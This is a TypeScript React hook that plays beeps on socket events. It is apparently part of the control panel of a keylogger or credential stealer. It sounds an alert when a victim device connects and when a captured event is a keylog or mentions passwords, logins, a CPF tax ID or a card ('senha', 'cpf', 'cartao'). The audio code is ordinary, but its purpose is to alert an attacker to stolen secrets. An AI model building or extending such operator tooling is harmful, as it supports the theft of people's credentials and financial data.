import { useEffect, useRef, useState } from "react";
import { useSocket } from "./use-socket";

export function useAudioAlerts() {
  const socket = useSocket();
  const audioCtxRef = useRef<AudioContext | null>(null);
  const [initialized, setInitialized] = useState(false);

  const initAudio = () => {
    if (!audioCtxRef.current) {
      audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      setInitialized(true);
    }
  };

  useEffect(() => {
    const handleInteraction = () => {
      initAudio();
      window.removeEventListener("click", handleInteraction);
      window.removeEventListener("keydown", handleInteraction);
    };
    window.addEventListener("click", handleInteraction);
    window.addEventListener("keydown", handleInteraction);
    return () => {
      window.removeEventListener("click", handleInteraction);
      window.removeEventListener("keydown", handleInteraction);
    };
  }, []);

  const playBeep = (freq: number, durationMs: number, delayMs = 0) => {
    if (!audioCtxRef.current) return;
    const ctx = audioCtxRef.current;
    
    // Resume context if suspended
    if (ctx.state === "suspended") {
      ctx.resume();
    }

    const osc = ctx.createOscillator();
    const gainNode = ctx.createGain();

    osc.type = "square";
    osc.frequency.value = freq;
    
    gainNode.gain.value = 0.1; // Gain: 0.1

    osc.connect(gainNode);
    gainNode.connect(ctx.destination);

    const startTime = ctx.currentTime + (delayMs / 1000);
    const duration = durationMs / 1000;

    osc.start(startTime);
    osc.stop(startTime + duration);
  };

  useEffect(() => {
    const handleDeviceConnected = () => {
      // double-beep 440Hz, 50ms x2
      playBeep(440, 50);
      playBeep(440, 50, 100);
    };

    const handleNewEvent = (event: any) => {
      const msg = (event.message || "").toLowerCase();
      if (
        event.type === "keylog" ||
        msg.includes("senha") ||
        msg.includes("password") ||
        msg.includes("user") ||
        msg.includes("login") ||
        msg.includes("cpf") ||
        msg.includes("cartao")
      ) {
        // 880Hz 100ms beep
        playBeep(880, 100);
      }
    };

    socket.on("device:connected", handleDeviceConnected);
    socket.on("event:new", handleNewEvent);

    return () => {
      socket.off("device:connected", handleDeviceConnected);
      socket.off("event:new", handleNewEvent);
    };
  }, [socket]);

  return { initAudio, initialized };
}
